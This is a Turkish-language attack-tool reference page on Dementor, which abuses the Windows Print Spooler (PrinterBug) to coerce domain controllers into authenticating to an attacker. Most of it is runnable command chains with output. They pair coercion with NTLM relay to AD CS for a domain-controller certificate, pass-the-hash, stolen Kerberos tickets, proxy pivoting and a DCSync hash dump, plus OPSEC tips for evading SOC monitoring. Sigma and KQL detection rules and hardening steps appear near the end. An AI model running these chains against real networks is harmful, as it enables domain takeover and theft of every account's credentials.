# Dementor

> **Kategori:** [4. ZEHİRLEME, ORTADAKİ ADAM VE ZORLAMALI KİMLİK DOĞRULAMA (POISONING & COERCION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Linux ortamında Python ve Impacket altyapısıyla çalışan, MS-RPRN Print Spooler protokolünü (PrinterBug) istismar ederek Windows sunucularını ve Domain Controller'ları saldırganın dinleyicisine kimlik doğrulamaya zorlayan sömürü aracı.

---

## 1. Genel Bakış ve Amaç

**Dementor** (Matthieu Garot / @notsec / n00py tarafından geliştirilen), Windows dünyasındaki ünlü `SpoolSample` (PrinterBug) koersiyon saldırısının **Linux ve Python** ortamındaki ilk ve en popüler karşılığıdır.

Microsoft'un **MS-RPRN (Print System Remote Protocol)** mimarisi, ağdaki sistemlerin bir sunucunun yazdırma kuyruğundaki değişiklik bildirimlerini uzaktan alabilmesi için `RpcRemoteFindFirstPrinterChangeNotificationEx` adlı bir RPC fonksiyonu sunar. İstemci bu fonksiyona geri bildirim adresi olarak saldırganın kontrolündeki bir UNC yolunu (`\\attacker_ip\pipe\spoolss`) ilettiğinde, hedef sunucunun **Print Spooler (`spoolsv.exe`)** servisi bu bildirimi iletmek üzere **NT AUTHORITY\SYSTEM** yetkileriyle belirtilen adrese derhal bir SMB veya HTTP bağlantısı başlatır.

SpoolSample bir C# (.NET) ikilisi olduğu için hedef ağda ya bir Windows hostu üzerinde çalıştırılmalı ya da C2 çerçevelerinin `execute-assembly` yeteneği kullanılmalıdır. Dementor ise tamamen Linux tabanlıdır; saldırganın Kali Linux, Parrot OS veya bir Linux VPS üzerinden doğrudan TCP 445 (SMB) ve RPC protokolleri üzerinden hedef Domain Controller'ı zorlamasına imkan tanır.

Dementor; **Pass-the-Hash (PTH)** ve **Kerberos ccache** biletlerini yerel olarak desteklediği için parola bilinmeyen senaryolarda veya NTLM trafiğinin yasak olduğu ortamlarda da rahatlıkla çalışır.

```
       [ Saldırgan: Dementor (Linux) ]
                     |
     1. MS-RPRN RPC Çağrısı (Port 445 SMB IPC$ / \pipe\spoolss)
        RpcRemoteFindFirstPrinterChangeNotificationEx(Listener: 192.168.1.50)
                     |
                     v
       [ Hedef Domain Controller (DC01) ]
                     |
     2. spoolsv.exe (SYSTEM Context) SMB Bağlantısı Açar:
        \\192.168.1.50\pipe\spoolss
                     |
                     v
     ================================================ Ağ (TCP 445)
                     |
                     v
         [ Dinleyici: ntlmrelayx / Responder ] (192.168.1.50)
                     |
     3. NTLMv2 Makine Kimliği AD CS / LDAP'a Relay Edildi!
                     |
                     v
         [ AD CS Sertifika Otoritesi ] ===> Domain Admin Sertifikası Alındı!
```

### Neden Önemli?
- **Windows Bağımsızlığı:** Operatörün bir Windows makinesine veya C2 ajanı kurmasına gerek kalmadan doğrudan Linux terminalinden PrinterBug tetiklemesini sağlar.
- **Pass-the-Hash Desteği:** Kullanıcı parolası bilinmese bile SAM veya NTDS dökümünden elde edilen NTLM hash ile RPC oturumu açılabilir.
- **SOCKS & Pivot Desteği:** `proxychains` üzerinden tünellenerek DMZ veya dış ağdan iç ağdaki Domain Controller'lara doğru çalıştırılabilir.

### Alternatif Araçlarla Karşılaştırma

| Özellik / Kriter | Dementor | SpoolSample | Coercer |
|---|---|---|---|
| **Çalışma Platformu** | Linux (Python 3 / Impacket) | Windows (C# .NET) | Linux (Python 3) |
| **Hedef Protokol** | Yalnızca MS-RPRN (Spooler) | Yalnızca MS-RPRN (Spooler) | 12+ RPC Protokolü |
| **Pass-the-Hash Desteği** | Var (`-hashes`) | Yok (Windows kısıtı) | Var (`--hashes`) |
| **Kerberos Bilet Desteği** | Var (`-k / ccache`) | Var (SSPI Token) | Var (`-k / ccache`) |
| **DC'de Varsayılan Açık mı?** | Genellikle kapatılır (Sıkılaştırma) | Genellikle kapatılır | DFS/EFS üzerinden aşabilir |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Dementor Impacket altyapısını kullanarak Python 3 üzerinden çalıştırılır.

```bash
python3 dementor.py -u <Kullanıcı> -p <Parola> -d <Etki_Alanı> <Dinleyici_IP> <Hedef_IP> [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `<Dinleyici_IP>` | Hedef sunucunun SMB bağlantısı açacağı saldırgan IP adresi (Zorunlu). | `192.168.1.50` |
| `<Hedef_IP>` | Zorlanacak Windows sunucusu veya Domain Controller IP/FQDN (Zorunlu). | `192.168.1.10` |
| `-u, --username` | RPC kimlik doğrulaması için etki alanı kullanıcısı. | `-u ahmet` |
| `-p, --password` | Kullanıcının parolası. | `-p Parola123!` |
| `-d, --domain` | Hedef Active Directory etki alanı adı. | `-d lab.local` |
| `-hashes` | Parola yerine LM:NTLM hash ile kimlik doğrulama (Pass-the-Hash). | `-hashes :e19ccf...` |
| `-port` | Hedef SMB bağlantı portu (Varsayılan: 445). | `-port 445` |
| `-k, --kerberos` | SMB ve RPC bağlantısında Kerberos kimlik doğrulaması kullanır. | `-k` |
| `--no-pass` | Parola sorma istemini kapatır (Kerberos ile zorunludur). | `--no-pass` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart Kimlik Doğrulamalı Dementor Tetiklemesi

Düşük yetkili bir etki alanı kullanıcısıyla hedef Domain Controller'ı dinleyiciye zorlama.

```bash
python3 dementor.py -u can.oz -p Pass123! -d lab.local 192.168.1.50 192.168.1.10
```

```text
[*] Authenticating to 192.168.1.10 as lab.local\can.oz...
[+] Connected to SMB IPC$ share!
[*] Binding to MS-RPRN RPC interface (\pipe\spoolss)...
[+] Bound successfully!
[*] Triggering RpcRemoteFindFirstPrinterChangeNotificationEx with UNC '\\192.168.1.50\pipe\spoolss'...
[+] Function dispatched successfully! Target server contacted listener!
```
*Analiz:* Dementor `\pipe\spoolss` borusuna bağlandı ve bildirim çağrısını iletti. Hedef Domain Controller anında `192.168.1.50` adresine SMB isteği gönderdi.

---

### Senaryo 2: Dementor ve ntlmrelayx ile AD CS ESC8 Sömürüsü (Domain Admin)

Tetiklenen Domain Controller makine hesabını kurumsal Sertifika Yetkilisine (AD CS) relay ederek DC makine sertifikası alma.

```bash
# Terminal 1: ntlmrelayx dinleyicisini başlat
sudo impacket-ntlmrelayx -t http://ca.lab.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Terminal 2: Dementor ile DC'yi dinleyiciye zorla
python3 dementor.py -u can.oz -p Pass123! -d lab.local 192.168.1.50 192.168.1.10
```

```text
[ntlmrelayx Konsolu]
[*] HTTP Client connected from 192.168.1.10 (DC01$)
[*] Relaying authentication for LAB\DC01$ to AD CS Web Enrollment...
[+] Successfully requested certificate for LAB\DC01$!
[*] Certificate exported to /tmp/DC01.pfx
```
*Analiz:* Dementor ile tetiklenen DC makine hesabı Sertifika Otoritesine relay edildi. Elde edilen `.pfx` sertifikası ile `gettgtpkinit.py` çalıştırılarak DCSync yetkisi elde edilir.

---

### Senaryo 3: Pass-the-Hash ile NTLM Hash Kullanarak Tetikleme

Açık metin parola olmadan bellekten çekilen NTLM hash ile çalıştırma.

```bash
python3 dementor.py -u operator -hashes :e19ccf750c72545f1b5f1b2b80429f08 -d lab.local 192.168.1.50 192.168.1.10
```

---

### Senaryo 4: Kerberos Bileti (ccache) ile Parolasız ve NTLM'siz Tetikleme

Golden Ticket veya çalınan bir bilet (`.ccache`) ile NTLM trafiği oluşturmadan çalıştırma:

```bash
export KRB5CCNAME=/tmp/administrator.ccache
python3 dementor.py -k --no-pass -d lab.local 192.168.1.50 dc01.lab.local
```
- Hedef mutlaka IP yerine FQDN (`dc01.lab.local`) olarak verilmelidir.

---

### Senaryo 5: rpcdump.py ile Ön Denetim Yapıp Dementor Çalıştırma

Dementor çalıştırmadan önce hedefte Spooler servisinin açık olup olmadığını pasif kontrol etme.

```bash
# 1. Kontrol: spoolss borusu açık mı?
rpcdump.py lab.local/can.oz:Pass123!@192.168.1.10 | grep -i "spoolss"

# 2. Açık olduğu doğrulandıktan sonra Dementor'u ateşle:
python3 dementor.py -u can.oz -p Pass123! -d lab.local 192.168.1.50 192.168.1.10
```

---

### Senaryo 6: Chisel / Proxychains Üzerinden İç Ağ Taraması

Pivot makine arkasındaki izole ağda bulunan sunucuyu Linux üzerinden koersiyona zorlama:

```bash
proxychains python3 dementor.py -u can.oz -p Pass123! -d lab.local 10.10.14.5 192.168.20.10
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Belirtisi / Log | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `STATUS_OBJECT_NAME_NOT_FOUND (0xc0000034)` | Hedef sistemde `\pipe\spoolss` named pipe'ı bulunamadı veya Print Spooler servisi kapatılmıştır. | DC üzerinde Spooler servisi sıkılaştırma amacıyla durdurulmuştur; alternatif koersiyon araçlarına (`PetitPotam` veya `DFSCoerce`) geçin. |
| `RPC_S_ACCESS_DENIED (0x5)` | Kullanıcının RPC arayüzüne bağlanma izni yoktur veya oturum açma bilgisi yanlıştır. | Geçerli başka bir etki alanı kullanıcısı deneyin veya kimlik bilgilerini doğrulayın. |
| `WERR_NCRR_SERVER_UNAVAILABLE (0x6ba)` | Hedef IP'ye veya SMB portuna (445) ulaşılamamaktadır. | Ağ bağlantısını ve güvenlik duvarını `nc -zvw 2 <hedef> 445` ile test edin. |
| `Target connected to listener but Relay failed: Server requires signing` | Hedef sunucuda SMB Signing zorunludur. | Hedef olarak SMB yerine imzalama zorunluluğu olmayan HTTP (AD CS Web Enrollment) seçin. |
| `Kerberos SessionError: KRB_AP_ERR_SKEW` | Linux makinesinin saati ile hedef DC saati arasında 5 dakikadan fazla fark vardır. | Saatinizi DC ile senkronize edin: `sudo ntpdate 192.168.1.10`. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Event ID & Telemetri)

- **Domain Controller Event ID 5145 (A network share object was accessed):**
  - Share Name: `\\*\IPC$`
  - Relative Target Name: `spoolss`
  - Access Mask: `0x12019F`.
- **Windows Security Event ID 4624 (Logon):**
  - Logon Type: `3` (Network Logon).
  - Çağrıyı başlatan kullanıcının kimlik bilgileri.
- **Sysmon Event ID 3 (Network Connection):**
  - **Kritik EDR Alarmı:** `spoolsv.exe` sürecinin harici bir IP adresine TCP 445 üzerinden giden bağlantı açması.

### 5.2 Ağ ve EDR İmzaları
- **spoolsv.exe Dış Bağlantı Anomalisi:** Normal şartlarda bir Domain Controller'daki Print Spooler servisinin diğer sunuculara veya rastgele IP'lere SMB bağlantısı açması beklenmez. EDR'lar (CrowdStrike, Defender for Identity) bu davranışı anında "PrinterBug / Forced Authentication" alarmı olarak işaretler.
- **RPC Opnum İmzası:** MS-RPRN arayüzünde Opnum `58` (`RpcRemoteFindFirstPrinterChangeNotificationEx`) çağrısının yapılması.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1187** | Forced Authentication | Print Spooler servisini SMB bağlantısı kurmaya zorlama. |
| **T1557.001** | Adversary-in-the-Middle: LLMNR/NBT-NS and SMB Relay | Tetiklenen makine kimliğini AD CS veya LDAP'a relay etme. |
| **T1021.002** | Remote Services: SMB/Windows Admin Shares | IPC$ ve spoolss named pipe erişimi. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Adımı |
|---|---|
| **Spooler Kapalıysa Alarm Riski:** Kapalı servise RPC çağrısı hata logu üretir. | Öncesinde `rpcdump` ile spoolss pipe'ının varlığını kontrol edin. |
| **spoolsv.exe Bağlantı Alarmı:** SOC ekipleri spoolsv bağlantılarını yakından izler. | Yalnızca yetki yükseltme aşamasında tek seferlik çalıştırın. |
| **Kerberos Kullanımı:** NTLM logları daha gürültülüdür. | Mümkünse `-k` (Kerberos) bayrağını kullanın. |

### 5.5 Savunma Karşılığı ve Blue Team Tespiti

#### Tespit Kuralı (Sigma — spoolsv.exe Ağ Bağlantısı Tespiti)
```yaml
title: Print Spooler Outbound Network Connection (PrinterBug)
status: experimental
description: spoolsv.exe sürecinin SMB (port 445) üzerinden dışarıya bağlantı açması.
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        Image|endswith: '\spoolsv.exe'
        DestinationPort:
            - 445
            - 139
    condition: selection
level: critical
```

#### Tespit Kuralı (KQL — Microsoft Defender for Endpoint)
```kql
DeviceNetworkEvents
| where InitiatingProcessFileName =~ "spoolsv.exe"
| where RemotePort in (445, 139)
| project Timestamp, DeviceName, InitiatingProcessAccountName, RemoteIP, RemotePort
| order by Timestamp desc
```

#### Sertleştirme ve Önleme Adımları
1. **Domain Controller'larda Print Spooler'ı Kapatma (ZORUNLU):** Domain Controller sunucularında fiziksel yazıcı bulunmayacağı için Spooler servisi tamamen kapatılmalıdır:
   ```powershell
   Stop-Service -Name Spooler -Force; Set-Service -Name Spooler -StartupType Disabled
   ```
2. **AD CS Web Enrollment Koruması:** Sertifika servislerinde EPA aktif edilmeli veya HTTP uç noktaları kaldırılmalıdır.
3. **SMB İmzalama:** Ağ genelinde SMB signing zorunlu hale getirilmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Standart Dementor çalıştırma (Linux -> Hedef DC)
python3 dementor.py -u ahmet -p Parola123 -d sirket.local 192.168.1.50 192.168.1.10
```
- **Ne Yapar?:** DC'nin Spooler servisini tetikleyerek `192.168.1.50` dinleyicisine SMB bağlantısı kurdurur.
- **Ne Zaman Kullanılır?:** Linux terminalinden doğrudan PrinterBug tetiklemek için.
- **Parametreler:** `-u/-p/-d`: Kimlik; `192.168.1.50`: Dinleyici; `192.168.1.10`: Hedef DC.

```bash
# 2. Pass-the-Hash ile NTLM hash kullanarak tetikleme
python3 dementor.py -u operator -hashes :e19ccf750c72545f1b5f1b2b80429f08 -d sirket.local 192.168.1.50 192.168.1.10
```
- **Ne Yapar?:** Parola bilmeden NTLM hash ile `spoolss` borusuna bağlanır ve tetikler.
- **Ne Zaman Kullanılır?:** Bellekten yalnızca hash elde edildiğinde.
- **Parametreler:** `-hashes`: NTLM hash formatı.

```bash
# 3. ntlmrelayx ile AD CS ESC8 sertifika relay dinleyicisi
sudo impacket-ntlmrelayx -t http://ca.sirket.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
- **Ne Yapar?:** Dementor'ın tetiklediği makine hesabını yakalayıp CA'ya relay eder.
- **Ne Zaman Kullanılır?:** DC sertifikası alarak etki alanını ele geçirmek için.
- **Parametreler:** `--adcs`: AD CS modu; `--template`: DC şablonu.

```bash
# 4. Kerberos biletleri ile kimlik doğrulama (-k)
export KRB5CCNAME=/tmp/ticket.ccache
python3 dementor.py -k --no-pass -d sirket.local 192.168.1.50 dc01.sirket.local
```
- **Ne Yapar?:** Ccache Kerberos biletini kullanarak Dementor çağrısını yürütür.
- **Ne Zaman Kullanılır?:** NTLM kısıtlamaları olan saf Kerberos ortamlarında.
- **Parametreler:** `-k`: Kerberos kullan; `--no-pass`: Parola sorma.

```bash
# 5. Hedefte spoolss pipe kontrolü (rpcdump)
rpcdump.py sirket.local/ahmet:Parola123@192.168.1.10 | grep -i "spoolss"
```
- **Ne Yapar?:** DC üzerinde Spooler servisinin dinlenip dinlenmediğini doğrular.
- **Ne Zaman Kullanılır?:** Dementor çalıştırmadan önce zafiyet uygunluğunu teyit etmek için.
- **Parametreler:** `rpcdump.py`: RPC arayüz sorgulayıcı.

```bash
# 6. Proxychains ile SOCKS tüneli üzerinden çalıştırma
proxychains python3 dementor.py -u ahmet -p Parola123 -d sirket.local 10.10.14.5 192.168.20.10
```
- **Ne Yapar?:** SOCKS proxy tüneli üzerinden iç ağdaki izole sunucuyu tetikler.
- **Ne Zaman Kullanılır?:** Dış ağdan pivot tüneliyle saldırı yaparken.
- **Parametreler:** `proxychains`.

```bash
# 7. SOCKS proxy modu ile SMB relay zinciri kurma
sudo impacket-ntlmrelayx -tf smb_targets.txt -smb2support -socks
```
- **Ne Yapar?:** Dementor ile zorlanan sunucuların kimliklerini SOCKS tünelinde saklar.
- **Ne Zaman Kullanılır?:** Relay edilen sunucular üzerinden dosya veya komut erişimi sağlamak için.
- **Parametreler:** `-socks`: SOCKS proxy başlat.

```bash
# 8. Elde edilen DC TGT'si ile DCSync çalıştırma
secretsdump.py -k -no-pass sirket.local/DC01\$@192.168.1.10 -just-dc-ntlm
```
- **Ne Yapar?:** Dementor + PKINIT zincirinden sonra etki alanının tüm parola hash'lerini dökerek operasyonu tamamlar.
- **Ne Zaman Kullanılır?:** Etki alanı tam kontrolü elde edildiğinde.
- **Parametreler:** `-just-dc-ntlm`: Parola dökümü.

```bash
# 9. Özel port üzerinden SMB bağlantısı kurma (-port)
python3 dementor.py -u ahmet -p Parola123 -d sirket.local -port 4445 192.168.1.50 192.168.1.10
```
- **Ne Yapar?:** Port yönlendirme (port forwarding) yapılmış senaryolarda özel portu hedefler.
- **Ne Zaman Kullanılır?:** SSH tüneli veya port redirection aktifken.
- **Parametreler:** `-port 4445`.

```bash
# 10. WebDAV formatında UNC adresi ile tetikleme
python3 dementor.py -u ahmet -p Parola123 -d sirket.local 192.168.1.50@8080/share 192.168.1.10
```
- **Ne Yapar?:** Spooler servisini SMB yerine WebDAV (HTTP) üzerinden bağlantı açmaya zorlar.
- **Ne Zaman Kullanılır?:** Port 445 engellendiğinde WebClient servisine yönlendirmek için.
- **Parametreler:** `@8080/share`: WebDAV formatı.

---

## Kaynaklar

- **Resmi GitHub Deposu (Dementor):** [https://github.com/n00py/Dementor](https://github.com/n00py/Dementor)
- **Lee Christensen — SpoolSample (PrinterBug):** [https://github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample)
- **Microsoft Open Specifications — MS-RPRN Protocol:** [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/)

---

> **Önceki:** [← ShadowCoerce](./ShadowCoerce.md) · **Sonraki:** [PrivExchange →](./PrivExchange.md)
